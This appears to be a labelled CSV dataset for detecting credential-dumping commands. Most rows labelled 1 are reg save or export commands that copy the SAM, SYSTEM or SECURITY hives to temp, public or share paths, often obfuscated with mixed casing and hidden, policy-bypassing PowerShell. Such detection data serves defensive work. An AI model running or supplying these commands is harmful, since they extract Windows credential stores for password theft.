text,label
POweRsHeLL -EXeC bYPAss -w hIDDen -C Reg eXpoRt  hklm\SAM  C:\USERs\puBLic\REGistry_exPOrt.reg  /y,1
pwsh -noprofile -c reg   export hklm\sam \.\c$ackup.reg,1
"CmD /c pOwERSHelL -C ""rEg.exe ExPort   hKEy_LoCAL_maCHine\SYsTem   \\LocAlHOST\c$\__DuMP\Sam.BAk""",1
reg export hkey_local_machine\sam   c:\windows\temp\sam.save,1
"CMd /C rEg.EXe  SAVE  ""HKEy_locaL_machIne\hKEy_LoCal_machINE\SOfTwaRE\woW6432NoDe\SUbkEY95""  ""c:\uSERS\pUBlIc\cHromE_DATa.BaK""",0
"cmd /c powershell -c ""reg.exe  save   hkey_local_machine\system   \.\c$ackup.reg""",1
"reg   restore   ""hkcu\software\policies\mycorp\subkey53""   ""hkcu\software\microsoft\windows\currentversion_227""",0
cMD.ExE /c start /B reg  Save  hKlm\secUriTy  C:\usErS\puBLIC\RegISTry_exPORt.Reg  /y,1
PoWERShELl -COMManD ReG.eXe  expORt hklm\sysTeM  c:\uSErs\pubLIc\RegISTry_EXport.reG,1
"reg  dELete  ""HKcU\eNViRoNMent""  /V VeRsIoN",0
C:\wiNdOws\systeM32\cmd.EXE /K reg ExpOrT  HklM\SEcUrIty   c:\WiNDoWs\temP\SaM.SaVe,1
"REg aDD ""hkCu\HKEY_LoCAL_mAChiNe\SYSTeM\curreNtCONTrOlset\cOnTROL""  /T reg_sZ /D ""c:\pRogRaM fiLes\APP""",0
"reg.exe  unload  ""hku\software\microsoft\windows\currentversion""  /v lastupdate",0
"CMD /c reg rESToRe ""hKCu\ENVIROnment"" ""HkcU\conTrol paneL\dESKtOp_801""",0
cMd.EXE /C staRt /b rEG.eXE  SavE   hkLm\SySTeM   \\LOCaLHOST\c$\__duMP\sam.bak,1
"cMD /c POweRSheLL -C ""REG.ExE  ExpORt   Hklm\sECUriTY   c:\uSErs\publiC\rEgIsTry_eXPort.Reg""",1
"Reg cOPy ""hkEy_USeRS\SOFTwARe\MyaPp\sETTiNGs\SubKeY65"" ""hKey_usERs\SOFtwaRe\cLaSsES_774""",0
"reg restore ""hkey_users\hkey_local_machine\software\policies\microsoft\subkey62"" ""hkey_users\software\myapp\settings_235""",0
c:\windows\system32\cmd.exe /k reg  save hklm\security  c:\windows\temp\sam.save   /y,1
c:\WINDoWS\SYsTeM32\CmD.exE /K REg.eXe ExpOrT   HkEy_LOCAl_maCHINE\SyStEM \.\c$Ackup.ReG /y,1
"start /b reg compare ""hkey_current_user\software\google\chrome\subkey18"" ""hkey_current_user\hkey_local_machine\software\wow6432node_901""",0
rEG.EXE  SAVe   hKEy_LOcal_mACHINE\SYSteM   C:\WINDOwS\tEmp\SAm.SAVE  /y,1
"cmd /c reg  query  ""hkey_users\software\classes""  /v version",0
cmd.exe /c start /b reg.exe   save   hklm\system \\localhost\c$\__dump\sam.bak,1
PowErsHELL -cOmmanD rEg EXpoRT HkLm\syStEm c:\WiNDOWs\tEmp\sam.SAVE   /Y,1
"ReG   REstOrE   ""hKEY_CurrENT_USER\SOFTWare\cLASsEs""   ""HkEy_cURrENT_UsER\hKEy_local_machIne\sySTem\CURrENTcONTRolsET\cOntrOL_552""",0
"reg delete ""hku\software\myapp\settings\subkey24"" /v lastupdate",0
"cmd /c reg add ""hkey_local_machine\software\microsoft\windows\currentversion"" /v lastupdate",0
"REg.exe   querY   ""hKU\sOFTwARe\myapP\sEttINGs""   /v VERsIon",0
"STarT /b reg   DElEtE   ""hKCu\SoFTWaRE\cLASSEs\SUbKEY89""   /v veRsIOn",0
"start /b reg.exe  query  ""hku\hkey_local_machine\software\policies\microsoft""",0
"reg.exe  add  ""hkey_local_machine\hkey_local_machine\software\wow6432node""  /v path  /t reg_sz  /d ""c:\program files\app""",0
"rEg CoPY ""HKCU\ENvIRonmenT\sUBkeY20"" ""hKCU\SYSTeM\CuRREntConTrolset\SERvices_653""",0
"cmd /c reg.exe  delete  ""hkcu\hkey_local_machine\software\policies\microsoft\subkey92""",0
"cmd /c reg.exe unload ""hkey_current_user\hkey_local_machine\software\wow6432node""",0
"reg save ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control"" ""c:\users\public\chrome_data.bak"" /y",0
"reG  Copy  ""hKEY_UseRS\HKey_loCAl_machIne\sYStem\CuRRenTconTrOLSEt\CONTroL\sUbKeY41""  ""HKEY_uSErs\SoFtWArE\claSsEs_495""",0
"cmd /c powershell -c ""reg.exe   save hkey_local_machine\security   c:\users\public\registry_export.reg""",1
"cmd /c reg add ""hkcu\software\classes\subkey67"" /v lastupdate /t reg_dword /d 1",0
"reg.eXE   reStorE   ""HkeY_curReNT_UsER\hkEY_Local_mAChINe\SYSTem\cUrrentcOntroLseT\cONtroL""   ""hkEy_CUrrenT_UsEr\hkEy_LoCal_MAcHine\SYSTeM\CuRrENTCONtRolsEt\CoNtrol_140""",0
"cmD /C POwerShelL -c ""Reg.ExE  SAVE   HkLm\System  c:\USERS\pubLiC\ReGistRy_exPoRT.REG   /y""",1
pWSH -nOProfIle -c rEg   sAve HKLm\securiTY c:\wINdOWS\temp\sam.sAve /Y,1
"ReG cOMPARe ""HKEY_USers\sofTWarE\GooGlE\ChROME\suBkey32"" ""hkEY_UseRs\EnVirOnMeNT_594""",0
reg.exe save  hklm\security  %temp%\sec_backup.dat   /y,1
pOWerSHElL -Exec Bypass -W HIDDeN -c Reg   EXPOrt  hklm\seCUrity  C:\USERs\puBlIc\REgiStrY_eXPort.ReG,1
"rEG cOPY ""HKcU\SoftwAre\goOGle\CHROMe\sUbKEy85"" ""hkcu\SoftWaRe\GoOgLe\ChRoME_808""",0
"StARt /b ReG  adD  ""Hkcu\SoFTwARe\MyAPp\SetTInGS\SUBkeY57""  /V LaStUpdaTe  /t rEG_sz  /D ""1.0.0""",0
"reg.exe restore ""hkey_users\software\microsoft\windows\currentversion\subkey28"" ""hkey_users\software\myapp\settings_223""",0
"rEG qUERy ""HKey_USers\SOfTWARe\claSsEs\SuBKEy83""",0
pwsh -noprofile -c reg.exe   export   hklm\security c:\users\public\registry_export.reg,1
"rEg   REsTOrE   ""hkEY_locAl_mAChine\SOftWare\poliCIEs\mYCORP""   ""HKey_loCAl_macHiNE\CoNtRoL pANEL\deSktop_792""",0
c:\WiNdOwS\sYStEM32\cMd.EXE /K Reg eXpORt   hkey_LoCaL_machiNE\SAm C:\winDOWS\tEmP\sam.sAve,1
"rEG.EXe   coMPAre   ""Hku\syStEM\curREnTcONTrOlSet\SErViCeS""   ""Hku\SoFTware\POlIcies\mycoRp_486""",0
"reg.exe  copy  ""hkcu\software\microsoft\windows\currentversion\subkey72""  ""hkcu\environment_731""",0
Cmd.EXe /c STArT /b rEg.Exe   EXpORT   hKLm\sEcuRITY %Temp%\sEC_baCkuP.dat /Y,1
"powershell -c reg   add   ""hkcu\hkey_local_machine\system\currentcontrolset\control\subkey13""   /v path   /t reg_dword",0
"REg  DELETE  ""hKCU\sOfTWAre\MyApP\setTIngs\SubkEy27""  /v LAsTUPdate",0
pwsh -nopROFiLe -c rEg.ExE eXporT HKeY_LoCAL_MAchine\sYstEM   c:\tEmp\sYStem.hIVE,1
"CMd /C ReG Add ""HKcu\soFTWAre\MYaPp\SEtTiNGs\SUBkeY92""  /T rEG_Sz /d ""c:\pROgRAm fiLeS\aPP""",0
pWSH -nOpRofILE -C REG   SaVE  hklM\sECUriTY  \.\C$acKUP.rEg,1
ReG   sAve hkey_lOcal_MAChiNe\sam   C:\uSErS\PUBLIc\ReGIStry_ExpORt.rEG,1
"rEg.EXE   rEStore   ""HkEy_CurRent_user\COnTRol pAnel\DeSKTop\SUbkEy47""   ""hKeY_cuRrENt_useR\ConTrOL PaNEL\dEsKTOP_146""",0
pOwERSHELL -EXEc bYPASs -w hIDdEn -C Reg.Exe   sAVe HKLm\sYSTem   \\lOCaLhOST\c$\__dUMp\Sam.BAK,1
"reg query ""hku\system\currentcontrolset\services\subkey18"" /v lastupdate",0
"ReG.Exe  COPy  ""HkCU\cONtROL PAneL\deSkTOP\SUBKEy6""  ""hKCu\SOfTwarE\google\ChroME_287""",0
poWeRsHELl -ExeC BYPaSS -w HiddEN -C Reg EXPorT   HklM\SecURIty  C:\wINDOWS\tEMp\SAm.SAVE,1
"cMd /c rEG.Exe sAve ""HKU\sOFtWaRE\GOogle\cHroMe\suBkeY34"" ""c:\wInDoWS\teMP\sOFtWAre_DUMp.daT"" /Y",0
"REG   rEStore   ""hKU\soFtWAre\pOlICIeS\MycorP""   ""HKU\HKEY_loCAl_MachInE\SOftware\POlICieS\miCroSOft_233""",0
PoWErSHElL -EXEc ByPasS -w HIddEn -C reg   Save HKLm\SySTEM   \\lOcAlhOSt\c$\__DuMp\SaM.bAK,1
Cmd.EXE /c rEG ExPORt   HKlM\SAm \\LoCaLHoST\C$\__DuMp\sam.BaK,1
"CmD /c rEG   COmpare   ""HKeY_loCAL_MachINe\HkEy_LOcAL_mACHInE\SofTWarE\WOW6432nODe\subkey51""   ""HkEY_LOcal_mAChIne\sYsTEM\CUrReNtCoNTRolseT\SErvices_289""",0
CMD.Exe /C reg SaVe   HKLM\seCUritY %TeMp%\seC_BackUP.dAt,1
"cmd /c powershell -c ""reg.exe export   hkey_local_machine\security  %temp%\sec_backup.dat""",1
"cMd /C pOWErshELl -C ""reg   eXPOrt  HKEY_lOcAl_maCHINE\Sam   \\localhOST\C$\__dUmp\Sam.BAK""",1
POWErshelL -ExEc bYpASs -W HiDDeN -C REG.Exe   exPORt HkeY_loCaL_mACHINe\SAm  c:\TemP\SYSTeM.hIVe   /Y,1
"rEG CoPy ""hkey_CurRENt_uSeR\Hkey_LOcal_machiNe\SOFTWaRe\pOLIcIeS\MIcROsoFt"" ""hKEy_cURREnt_useR\SoFTware\CLaSSEs_701""",0
c:\wINdoWs\SySteM32\CMd.eXe /K REG.eXE  EXpORT   HKey_lOcal_mACHInE\sAM C:\TemP\SYstem.hIVe,1
"pOweRSheLL -C reg.Exe  coMpaRe  ""HKeY_uSERS\COnTROL paneL\DeSkTOp""  ""Hkey_USeRs\SYStem\cUrRentcoNTROLSet\SeRVIcES_262""",0
c:\windOWS\SYsTeM32\CMD.exE /K REg  SaVe HkLM\SECUrITY  \\lOcALHOsT\C$\__dUmp\sAM.BAk  /y,1
c:\windows\system32\cmd.exe /k reg.exe save   hkey_local_machine\sam   c:\windows\temp\sam.save   /y,1
"staRT /b reG SavE ""HKey_lOCAL_mAChINe\COntrol pAneL\DESktOp"" ""C:\TEMp\USER_sEttINGS.reG""",0
c:\windoWs\SYStem32\CMd.ExE /K ReG  SavE hKLm\SAm C:\USErS\Public\reGisTRy_EXPORT.reG /Y,1
"sTArT /b Reg  aDD  ""hkey_curreNt_useR\HkEy_LOCAl_maCHInE\soFTwarE\woW6432nODE""  /V vERSioN  /T Reg_sz  /d ""C:\proGrAM fiLEs\ApP""",0
"reg   query   ""hkey_local_machine\system\currentcontrolset\services\subkey45""   /f",0
cmd.exe /c start /b reg.exe   save  hklm\security   %temp%\sec_backup.dat   /y,1
cmd.exe /c start /b reg.exe  export hklm\system  \.\c$ackup.reg,1
REG  ExPORt   HKLm\saM   \\loCALHoST\c$\__DumP\sAm.bAK,1
rEG.eXE saVE  HKeY_lOcaL_MaCHine\SEcurITY \.\C$AckUp.rEg,1
"stArt /B reG.exE  dElete  ""hKcu\SoFtwARE\polICieS\MYcoRP\sUbkEY26""  /v veRsIon",0
"Reg.EXe coPy ""HkEY_cURReNt_User\SYSTem\cURReNTCoNtrOlsEt\seRVicEs\SUbKEy29"" ""hKey_CUrrENT_User\SOFtWARE\microSOFt\wINdOWS\currEnTvErSiON_874""",0
"reg.EXE Query ""HKeY_LoCAL_macHiNE\enVIroNMent""",0
C:\WINdows\sysTeM32\cMD.EXe /K reG exPoRt hkey_lOCAl_MACHine\sYStEm   C:\USerS\PuBlIc\rEgistry_eXPOrt.rEG  /Y,1
"StARt /B REg.eXE  querY  ""hkeY_usERs\ENvirOnmENt""  /v VersiON",0
Reg.eXE  savE  HKlm\SySTEM  c:\UserS\publiC\regISTRy_EXpOrT.rEG   /y,1
"STArT /B rEG   COPY   ""hKEY_cuRrEnT_usER\EnvIRonmenT\suBkeY14""   ""hkeY_CURREnT_uSER\SofTwArE\myApP\settINgs_705""",0
cmd.exe /c reg.exe export hklm\system   c:\temp\system.hive /y,1
pwsh -noprofile -c reg.exe   export   hkey_local_machine\system c:\users\public\registry_export.reg /y,1
CmD.eXe /C STart /b rEg  SAvE  HkeY_LocAL_mACHINe\sam c:\USERs\PUBLic\REGIstRy_exPORt.REg /y,1
"REG   savE   ""Hkey_LocAL_MAcHINE\HkEY_lOCaL_mAcHINE\sOFtwarE\PoLIcies\MicRoSoFt""   ""C:\USers\PUbLic\ChROme_dAta.bak""",0
"Cmd /C PoWERsheLl -C ""rEg.EXE savE Hklm\sYSTEm  %TEmP%\sec_bacKup.daT  /y""",1
"rEG.exE   unlOAd   ""Hku\SOftWARE\micRosOft\WinDowS\curReNtVERSiOn\SuBkEY81""   /V lASTupDAte",0
"reg   copy   ""hku\system\currentcontrolset\services\subkey52""   ""hku\software\microsoft\windows\currentversion_803""",0
reg.exe  export hklm\sam   \\localhost\c$\__dump\sam.bak,1
powershell -command reg   save  hklm\system c:\users\public\registry_export.reg   /y,1
"sTArt /B reG UnLoad ""hkEY_CURRent_USER\HKeY_LOCAL_MacHINE\soFTWARE\pOLIcies\mICROSOft\SUbKEY72"" /v laStUPdate",0
cmd.exe /c reg.exe  export hklm\security   c:\windows\temp\sam.save /y,1
"start /b reg  query  ""hku\software\google\chrome""  /v version",0
c:\wInDOWS\sYstEm32\CMd.ExE /K rEG  sAvE   HKlm\systEm   \.\c$ACKUP.Reg,1
"pOwErShElL -C REg  cOpY  ""hku\sofTWArE\poLiCiES\myCOrP\SUBKeY21""  ""HKU\COntROL paNEL\DESktOp_923""",0
Cmd.EXE /C reg   sAVe   HKLm\sAm \.\c$ACKup.reg,1
"powershell -c reg.exe copy ""hkcu\system\currentcontrolset\services\subkey13"" ""hkcu\hkey_local_machine\software\policies\microsoft_887""",0
PowERsHELl -COmMANd rEG save hkeY_LoCAl_mACHine\SystEM  C:\userS\PUbLIC\ReGiStRY_EXPOrt.rEG   /y,1
cmd.eXE /C Reg EXPoRt hkeY_lOCal_MAchinE\sam   %tEMP%\SeC_bAckUp.dat,1
"CMD /c Reg.exE SAvE ""hkEy_loCAL_MachinE\hkEy_locAl_MAchinE\SofTWARE\POlICiES\miCrOSOfT"" ""c:\WindOwS\teMp\sOftWARe_DUmP.Dat""",0
"PowErshell -c REg.eXe   reStOrE   ""Hkey_loCAL_maCHiNE\HkEY_LOcaL_maCHInE\SOfTWARe\wOW6432noDe""   ""hkeY_lOcAl_MaChIne\cOnTroL PAnEL\dESKToP_722""",0
"cmd /C Reg  AdD  ""HkEY_Local_MaChiNE\ENvIrONMenT""  /v pATh    /D ""C:\PRoGrAM fIles\APP""",0
"rEG.ExE   UnloAD   ""Hku\hKEY_loCAL_MacHine\sysTem\CUrRentconTroLSEt\cONTrOL""   /v vErSioN",0
"rEg.EXe  rEStorE  ""HkEY_uSERS\HkEY_lOCAl_MacHine\sYSteM\cuRrEntCoNTROlSET\CoNtRol""  ""hkEY_usErS\SOFtwArE\MYApp\SettiNgS_128""",0
"reg   compare   ""hkey_users\software\classes\subkey98""   ""hkey_users\software\classes_747""",0
"reg  delete  ""hkcu\software\microsoft\windows\currentversion\subkey10""  /v version",0
"cMd /C reG.ExE   uNlOad   ""HKEY_uSERS\SOFTwaRe\micROsoft\WindOWS\cUrreNTvErsIon""   /f",0
reG   sAVe HkeY_LOcal_MAcHiNe\SysTem   %teMp%\sec_bACKUp.DAt  /y,1
CmD.exe /c reg.EXE   eXport   HkEy_LoCAL_maCHInE\SecURiTy  c:\USeRS\puBliC\ReGISTry_EXPORt.ReG   /y,1
"Reg.eXE cOPY ""HKu\SOFTWARe\mYapp\setTIngs"" ""HKU\softwArE\gOOgle\cHROmE_404""",0
"CmD /c poWErShElL -c ""reG  savE   HKEy_Local_machINe\seCuRITy \.\C$AcKUp.rEg   /Y""",1
CMd.eXE /C rEG.ExE save   hKey_loCaL_mAchinE\SAm   C:\Windows\temP\Sam.sAVE,1
c:\windows\system32\cmd.exe /k reg.exe  export  hklm\system \\localhost\c$\__dump\sam.bak,1
"cmd /c reg query ""hkey_users\software\myapp\settings\subkey46"" /v version",0
reg export   hkey_local_machine\security  c:\windows\temp\sam.save /y,1
cmD.ExE /c reg.eXE EXpORT hkLm\SyStEm c:\userS\PubLIC\REGisTRY_EXpoRt.REG /Y,1
c:\windows\system32\cmd.exe /k reg   export   hkey_local_machine\security   c:\users\public\registry_export.reg,1
"reg.exe  add  ""hkey_users\control panel\desktop""  /v version  /t reg_sz  /d ""c:\program files\app""",0
poWERShell -coMMand rEg.ExE   sAvE hKEY_lOcAl_MACHiNe\SEcuRitY   c:\WINDoWs\tEmp\sAm.SAvE,1
pOwersHeLl -ComMaND REG  exPOrT HklM\sysTEM   c:\Temp\sYsTem.HivE,1
"Start /B reG  cOPy  ""HkCU\SOfTwArE\mIcroSOfT\wiNDOws\CuRreNtveRSiON""  ""hkCu\envIROnMeNT_700""",0
PoweRSHELl -exec BYpasS -w hIDdEn -C reg.ExE EXPOrT  hKlM\sECUrity  %TEmP%\SeC_baCKUP.DAT   /y,1
cmd.exe /c start /b reg.exe  export   hkey_local_machine\system \\localhost\c$\__dump\sam.bak /y,1
c:\windows\system32\cmd.exe /k reg.exe save hkey_local_machine\system   %temp%\sec_backup.dat,1
"cmD /c REg.ExE qUerY ""hKEY_cURReNt_USER\HKEy_lOcAl_mACHiNE\soFTwarE\poLicIeS\MicROSOfT"" /V PaTH",0
"reG  cOPy  ""hkEy_curREnt_uSeR\HkEy_LocaL_MAcHIne\SySTeM\CUrrentCOnTrOlSeT\contRol\SuBKEy67""  ""hKEy_currEnt_uSeR\sOfTwArE\GooGlE\ChroME_260""",0
reg  save   hkey_local_machine\sam   c:\windows\temp\sam.save /y,1
reg  eXPORt   HKLm\sAm %TEMp%\SEC_BaCKuP.DAt,1
Cmd.eXe /c rEG.EXe  SaVE   hKey_LOCAl_mAchIne\SYsTem %TeMP%\SEC_BACKUp.DAt,1
"start /B ReG.eXe   AdD   ""HKeY_LOcal_MAchInE\SOFtWaRE\PoLICiES\mYCORp\SUBkEy19""   /V LAsTUPDAtE      /d ""C:\progRAM FIles\ApP""",0
c:\WindOWs\sYSTEM32\cMd.EXE /K Reg.eXE   SAvE hKlM\SEcUrItY %teMP%\sec_BaCkuP.DAt  /Y,1
"rEg cOpy ""Hkey_cUrrENT_USEr\hKey_locAL_mACHine\soFTwaRe\PolIciEs\MicrosoFT"" ""hkEy_cUrrENT_usER\coNTrOl pANel\deSKtOp_552""",0
cMd.exE /C reg.eXE save   HKlm\SyStem %tEmP%\sec_bacKuP.DaT,1
"reg.exe   delEte   ""HKeY_CurreNt_uSEr\hkeY_lOCAL_MaChInE\sOfTWaRe\wow6432noDE\SUbKEY7""   /V vERSIOn",0
"STaRt /b rEG query ""HKEY_CURrent_usER\HkEy_LOCal_mACHiNE\sOFtwARe\Wow6432NoDE\SuBkeY46"" /f",0
"StARt /b rEg.exe UnLOad ""HKeY_curRENT_user\enviroNment\sUBkey97"" /v PATH",0
cMd.eXe /C stArt /B rEG  Save  hkEy_loCAl_MAChInE\syStem \.\C$acKUP.ReG,1
poWeRsHEll -ExeC bYpASS -w hiDDEN -C rEg.exe   SAvE Hklm\SYstEM   C:\winDOWs\tEmP\SaM.saVe,1
REg.eXE   eXpoRt   HKLM\SAM  c:\temP\SySTEM.HiVE,1
"rEG   UnlOaD   ""HKEy_cUrReNt_USeR\HKEy_lOcAL_maCHInE\soFTWARe\PolIcies\miCrOSoft""   /V LaStupDATE",0
pOWershEll -exec ByPASS -w hidDEn -c Reg  sAVe   HKlM\Sam  %teMP%\sEC_BAckuP.dat,1
"starT /b reG   ADd   ""hkEY_cURReNt_USer\soFTWARe\google\cHRoME""      /T reg_dwoRD   /D ""C:\PROGram FIlES\aPp""",0
"sTArT /b REg REStore ""hkeY_currenT_uSer\sOftWARE\myaPP\SETTiNgS"" ""hKeY_cUrREnt_UsER\HKEY_locAL_MAcHinE\sOfTwarE\woW6432Node_929""",0
pwSH -nOPrOfilE -C REG.EXe  sAVE  hKEY_LOCal_MachINE\SECUriTy \.\c$aCkUP.ReG,1
"rEG.eXE  DeLetE  ""hKU\sYSTem\cuRReNtconTROlSeT\SeRvices""  /v path",0
"REg.Exe   rEStore   ""hKeY_useRS\SofTwAre\MYApp\SettiNGs""   ""hkEY_USeRs\sOfTwaRe\clAsses_934""",0
cMD.EXe /C STArt /b REG.exE  SAVe   HKeY_lOCal_machINe\saM \.\C$AckUP.REG,1
"reg.exe  unload  ""hku\software\classes""  /v version",0
Cmd.eXE /c START /B rEg   sAvE   HKEY_local_macHinE\SYsTEM   \\LocaLhosT\C$\__dUmP\SAM.baK,1
cMd.EXe /C sTArT /B REG.exe  EXPort   HkLm\SecurITY   c:\UseRS\publIC\rEgIStrY_exPOrT.rEg,1
cmd.exe /c reg.exe save hkey_local_machine\sam   \.\c$ackup.reg,1
"powershell -c reg compare ""hkcu\hkey_local_machine\software\policies\microsoft\subkey8"" ""hkcu\hkey_local_machine\software\policies\microsoft_491""",0
cmd.exe /c start /b reg.exe   save hkey_local_machine\system   c:\users\public\registry_export.reg,1
"REg  SavE  ""hKeY_lOCal_MaCHINE\SoFTWaRe\goOglE\cHROme""  ""%TEMp%\nOn_sEnsitiVe.hIVe""",0
"cmd /c powershell -c ""reg.exe   save  hklm\security \.\c$ackup.reg""",1
"STARt /b Reg   Copy   ""Hkcu\sOFTWArE\myApP\SETtings\sUbkeY46""   ""HkCu\SoFtWarE\CLASSes_250""",0
"reG  COmPaRE  ""HkEY_LOcal_machInE\soFTWARE\gOoGLe\ChrOMe""  ""hkEY_local_MACHiNe\cOntroL PANeL\DEsKTOp_211""",0
"reg  unload  ""hkcu\hkey_local_machine\software\wow6432node""  /v path",0
"Reg  sAVe  ""hkEy_LoCaL_macHiNE\HkEY_LOCal_maChInE\SYStEM\curRENtConTrOlSET\COnTRol""  ""C:\tEMP\UseR_SetTIngS.reG""  /Y",0
"Reg cOMParE ""hkCU\ContROL panEL\deSktoP\Subkey94"" ""hKCU\HkEY_LOCaL_mAcHINe\softWARe\pOlIcIES\MICRosOfT_704""",0
"PowerSheLL -c Reg.exe COpy ""hkcu\SoftwArE\pOlICiES\mycoRp\subkEY23"" ""HKCU\sOftwArE\myaPP\SeTTInGS_361""",0
"Reg.exE  ReStorE  ""hkey_UseRS\SOfTwAre\GOOGLE\cHROMe\SubKEY22""  ""hkEy_userS\CONTROL PAnEL\DESKTOp_348""",0
pOwERSHelL -eXEC BypasS -W hiddEn -c reg.EXE EXporT  Hklm\System \\LocALhoSt\c$\__dUmp\sAm.bak  /y,1
"powershell -c reg  copy  ""hkey_users\software\microsoft\windows\currentversion\subkey93""  ""hkey_users\system\currentcontrolset\services_588""",0
"REG.Exe   Save   ""hkcu\sOftWaRE\POLICies\mYcOrp""   ""C:\TeMP\uSer_SeTtiNGS.reG""",0
PoweRSHELl -eXec bypAsS -W hiDDEn -c ReG   EXporT HklM\syStEm c:\TEmp\sYsTEm.Hive,1
"start /b reg.exe  add  ""hkey_local_machine\software\myapp\settings""  /v path  /t reg_dword",0
"powershell -c reg.exe  delete  ""hkcu\software\myapp\settings\subkey96""",0
POwerSHell -exEC bypaSs -W HIDDeN -C rEg.exe savE  hkey_LocAL_mAcHINE\SAM %TEmP%\sec_BAcKUp.dAT,1
c:\WInDows\system32\Cmd.exE /k rEG.exE   ExpOrt HkeY_Local_MACHINE\Sam  \\loCALHOsT\c$\__dUmP\sAm.bAK,1
powershell -exec bypass -w hidden -c reg.exe export  hklm\system   \.\c$ackup.reg,1
"cmd /c powershell -c ""reg.exe  export hkey_local_machine\sam   %temp%\sec_backup.dat   /y""",1
POwershelL -CoMmaNd rEg.eXe SAve hkLM\SEcuRiTY   c:\uSERS\PUbLIc\RegiSTry_exPOrT.ReG   /y,1
cmd.exe /c STaRt /b reg  sAVe  Hklm\SySTem  %TemP%\sEC_BACkuP.dAt  /Y,1
cmd.exe /c start /b reg.exe export  hkey_local_machine\system  \\localhost\c$\__dump\sam.bak,1
REg save   HKey_loCaL_MaChInE\SecURitY   \.\C$ackup.Reg  /Y,1
REg.EXe  SavE hKlM\SecUrITy   \.\c$ACKup.Reg  /Y,1
cmD.ExE /C rEG  Save   Hklm\sAM C:\wiNdows\tEMP\SaM.SavE   /y,1
"cmd /c powershell -c ""reg   save  hkey_local_machine\sam %temp%\sec_backup.dat""",1
"sTArT /B REG cOMpare ""HKCU\sOftwARE\CLaSses\SuBKEY50"" ""hKcU\SoftWare\poliCIES\MYcORp_775""",0
PoweRShelL -EXEc BypAss -W HIDdEn -c rEG.EXE   exPOrT  Hkey_lOcaL_MachiNE\SAM   \.\C$aCkUP.reG,1
c:\winDOWs\SYstEM32\CMd.EXe /k rEg ExPOrt hklm\SystEM c:\wIndows\TeMp\sAM.SAvE   /y,1
cMD.exE /c sTart /b rEg  EXPOrt Hklm\sySTEm   c:\USeRS\PUblIC\REgIstry_EXpORt.rEG  /Y,1
cmD.exe /c STArt /B REg.exE  sAVe HkEY_LOcAl_MaChInE\sECuritY  C:\wINDoWS\TEmp\Sam.sAvE,1
c:\windows\system32\cmd.exe /k reg   save hklm\system   c:\users\public\registry_export.reg   /y,1
PowersHeLL -commAND reG  sAVE   HKey_local_MacHine\sAm  c:\WindowS\Temp\sam.SAve,1
cMD.Exe /C rEg.ExE  SaVe hKEy_loCaL_MacHIne\SAm  c:\TemP\sYSTeM.HivE,1
Reg.eXE   ExpORT   Hklm\SySTEm  %temP%\SEc_bAcKUp.dAT /Y,1
"REg  DeLetE  ""hkU\softWAre\CLassEs\sUBKEy77""  /v lAStuPDaTE",0
"CmD /c REG   COMPARE   ""hkU\HKEy_LOCaL_MacHine\syStEM\cuRReNTCOntRolSeT\CoNTrOL\suBKEy59""   ""hku\HKEY_lOcAL_mAcHinE\sySTeM\cUrrENtConTRoLSEt\cONTrol_686""",0
pOWeRshElL -exEC ByPass -w hidDEN -c ReG  export  HKlm\SAm \\lOCaLhoST\c$\__DUmp\sAm.bAk,1
"cmd /c reg delete ""hkey_local_machine\software\myapp\settings\subkey6"" /v lastupdate",0
powErsHELL -EXEC bYPAss -W hiddEn -C ReG.EXe   eXport hkeY_LOCal_MaChiNE\sECURIty   c:\USERS\pUBLIC\REGIsTRY_EXPorT.rEG,1
powershell -exec bypass -w hidden -c reg  save hklm\security c:\users\public\registry_export.reg,1
POWeRShell -COmmand ReG.EXe   saVe   hkey_LOCAl_MAChine\SYSTem \\lOcAlHost\c$\__DUMp\SAM.BAk  /y,1
pWsH -noPrOfILE -C Reg.EXe   exporT HKlM\sEcURitY   C:\winDoWS\TEmP\SAM.savE  /y,1
"powershell -c reg copy ""hkey_users\software\google\chrome\subkey99"" ""hkey_users\software\classes_549""",0
powershell -exec bypass -w hidden -c reg save   hkey_local_machine\security c:\windows\temp\sam.save   /y,1
"Start /B ReG   DElete   ""hKEy_LoCal_mAChine\ENVIRONMeNT\suBkEY33""   /v path",0
"reg  compARe  ""hKEy_cuRrEnt_User\HkEY_LocaL_mAcHiNE\sofTWaRE\WOw6432nODE""  ""hKey_cuRReNT_user\sOfTWARE\cLasSes_380""",0
c:\winDoWs\sySTem32\Cmd.eXe /k reG.eXE  eXpoRt  HKlM\SEcURITy %TEmP%\sEC_BAckUp.dAT   /Y,1
"reg  query  ""hkey_users\system\currentcontrolset\services\subkey55""",0
